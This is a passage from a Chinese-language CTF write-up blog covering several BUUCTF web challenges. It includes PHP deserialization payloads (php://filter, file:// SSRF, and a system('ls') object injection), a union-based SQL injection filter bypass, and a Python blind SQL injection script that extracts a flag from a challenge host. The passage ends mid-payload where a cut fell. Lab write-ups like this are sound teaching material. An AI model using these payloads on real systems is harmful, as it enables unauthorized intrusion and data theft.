class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–ç»“æœï¼š<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p><p>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p><p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;2&quot;</span>;<br> <br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¿‡base64è§£ç å¾—åˆ°flag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>All You Want Is In Table â€˜flagâ€™ and the column is â€˜flagâ€™<br>ç¡®å®šè¡¨å’Œå­—æ®µ</p><p>éšä¾¿è¾“å…¥<br>æŸ¥è¯¢1ï¼Œ2ä¼šæœ‰å›æ˜¾ï¼Œå…¶å®ƒçš„ä¼šæ˜¾ç¤ºé”™è¯¯<br>id&#x3D;1 Hello, glzjin wants a girlfriend.<br>id&#x3D;2 Do you want to be my girlfriend?<br>è¾“å…¥if(true,1,2) è¿”å›Hello, glzjin wants a girlfriend.<br>è¾“å…¥if(false,1,2) è¿”å›Do you want to be my girlfriend?</p><p>å¯ä»¥ç”¨è¿™ç§æ–¹æ³•åˆ¤æ–­flagçš„å€¼<br>å†™ä¸€ä¸ªè„šæœ¬(è¦ç”¨åˆ°time.sleepï¼Œä»¥é˜²å‡ºç°429é”™è¯¯ï¼Œè¿™ä¸ªè„šæœ¬æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯å®ƒä¸èƒ½åŒ¹é…<code>-</code>ï¼Œæ‰€ä»¥è¦åœ¨ç©ºç¼ºçš„åœ°æ–¹æŠŠ<code>-</code>è¡¥å¥½ï¼Œåœ¨æˆ‘çš„æœºå™¨ä¸­time.sleep()æœ€å¥½çš„è®¾ç½®ä¸º0.1-0.4ï¼Œå› ä¸ºåˆ°äº†åé¢ä»ç„¶ä¸ä¼šæ˜¾ç¤º<code>-</code>)<br><strong>429é”™è¯¯</strong>ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚è¿‡å¤šï¼Œè¶…å‡ºäº†æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›æˆ–é™åˆ¶ã€‚ å®ƒæ˜¯ä¸€ç§ååº”é€Ÿç‡é™åˆ¶çš„çŠ¶æ€ç ï¼Œç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå½“æ”¶åˆ°429çŠ¶æ€ç æ—¶ï¼Œå®¢æˆ·ç«¯åº”è¯¥é‡‡å–æªæ–½å‡å°‘è¯·æ±‚é¢‘ç‡æˆ–ä¼˜åŒ–ä»£ç ï¼Œä»¥é™ä½æœåŠ¡å™¨çš„è´Ÿè½½ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br><br><span class="hljs-attribute">s</span>=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,60):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://becd3bf4-4a7a-41db-af52-6bc45f25b20e.node4.buuoj.cn:81/index.php&quot;</span><br>        <span class="hljs-attribute">sqls</span>=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.format(i,j)<br>        #<span class="hljs-built_in">print</span>(i)<br>        #<span class="hljs-built_in">print</span>(sqls)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,<span class="hljs-attribute">data</span>=data)<br>        #<span class="hljs-built_in">print</span>(c.text)<br>        time.sleep(1.0)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>çœ‹åˆ°æ³¨å†Œé¦–å…ˆæƒ³åˆ°äº†å­˜å‚¨å‹xssï¼Œä¸€é¡¿xè¿”å›çš„PHPSESSIDå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨<br>æ­£å¸¸æ³¨å†Œblogå°±å¡«<code>www.baidu.com</code>æŠŠ<br>è‡ªåŠ¨è·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢åï¼Œå¯ä»¥å‘ç°usernameæ˜¯ä¸€ä¸ªè¶…é“¾æ¥<br>ç‚¹å‡»è¿›å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c5d58095-<span class="hljs-number">7</span>b7c-<span class="hljs-number">4</span>cad-b014-<span class="hljs-number">237</span>ca4cccdcf.node4.buuoj.cn:<span class="hljs-number">81</span>/view.php?no=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç–‘ä¼¼SQLæ³¨å…¥<br>è¿‡æ»¤äº†union select,ç”¨union all selectç»•è¿‡<br>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,data,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure><p>usernameåˆ—è¿”å›<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </code></p><p>å±äºæ˜¯è¢«åºåˆ—åŒ–äº†ï¼Œé‚£åº”è¯¥è¿˜æœ‰æˆ‘ä»¬åº”è¯¥çŸ¥é“çš„æºä»£ç æ²¡æœ‰æ‰¾åˆ°<br>dirsearchæ‰«ä¸€æ‰«<br>æ‰«å‡ºè¿™ä¹ˆå‡ ä¸ªèƒ½ç”¨çš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/db.php<br>/error.php<br>/flag.php<br>/login.php<br>/robots.txt<br>/view.php<br></code></pre></td></tr></table></figure><p>è¿›å…¥&#x2F;robots.txtæ‰¾åˆ°&#x2F;user.php.bak<br>ä¸‹è½½<br>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯</span><br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<span class="hljs-comment">//æ‰§è¡Œç»™å®šçš„cURLä¼šè¯</span><br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-comment">//è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>éœ€è¦äº†è§£çš„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>   &#123;<br>       <span class="hljs-variable">$ch</span> = curl_init();<span class="hljs-regexp">//</span>åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯<br><br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-regexp">//</span>ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹<br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<span class="hljs-regexp">//</span>æ‰§è¡Œç»™å®šçš„cURLä¼šè¯<br>       <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-regexp">//</span>è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>           return <span class="hljs-number">404</span>;<br>       &#125;<br>       curl_close(<span class="hljs-variable">$ch</span>);<br><br>       return <span class="hljs-variable">$output</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure><ul><li>curl_init ï¼š åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</li><li>curl_setopt ï¼š è¯·æ±‚ä¸€ä¸ªurlã€‚å…¶ä¸­CURLOPT_URLè¡¨ç¤ºéœ€è¦è·å–çš„URLåœ°å€ï¼Œåé¢å°±æ˜¯è·Ÿä¸Šäº†å®ƒçš„å€¼ã€‚</li><li>CURLOPT_RETURNTRANSFER å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</li><li>curl_execï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ ç„¶è€Œï¼Œå¦‚æœ CURLOPT_RETURNTRANSFERé€‰é¡¹è¢«è®¾ç½®ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœï¼Œå¤±è´¥æ—¶è¿”å› FALSE ã€‚</li><li>CURLINFO_HTTP_CODE ï¼šæœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç ã€‚<br>curl_getinfoï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å®ƒçš„å€¼ï¼Œå› ä¸ºè®¾ç½®äº†CURLINFO_HTTP_CODEï¼Œæ‰€ä»¥æ˜¯è¿”å›çš„çŠ¶æ€ç ã€‚</li></ul><p>å¦‚æœçŠ¶æ€ç ä¸æ˜¯404ï¼Œå°±è¿”å›execçš„ç»“æœã€‚<br>getå‡½æ•°åœ¨getBlogContents()é‡Œè¢«è°ƒç”¨ï¼Œä¼ å‚ä¸ºblog<br>ç»™å‚æ•°èµ‹ä¸ªå€¼ï¼Œååºåˆ—åŒ–çœ‹çœ‹flag.php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new UserInfo();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">age</span>=12;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">blog</span>=<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/WLVRMOO2ZVHZ1IHR1E.png"><br>æŸ¥çœ‹æºä»£ç <br><img src="/images/FISBFG6M8XZVKJ8.png"><br>base64è§£ç å°±å¯å¾—åˆ°flagäº†</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>é¡µé¢ä¸€ç›´åœ¨åˆ·æ–°ï¼ŒæŠ“ä¸ªåŒ…å…ˆ<br><img src="/images/ZQSBGIA79FQDV2.png"><br>POSTæ£€æŸ¥å‰é¢æ˜¯å‡½æ•°ï¼Œåé¢æ˜¯å‚æ•°<br>è¿™é‡Œeval(system(â€˜lsâ€™))ç”¨ä¸äº†äº†ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†<br>åº”è¯¥æ˜¯ç”¨äº†call_user_func()å‡½æ•°ï¼Œç”¨file_get_contentsçœ‹ä¸€ä¸‹æºä»£ç </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œç”¨ååºåˆ—åŒ–è¯•è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span 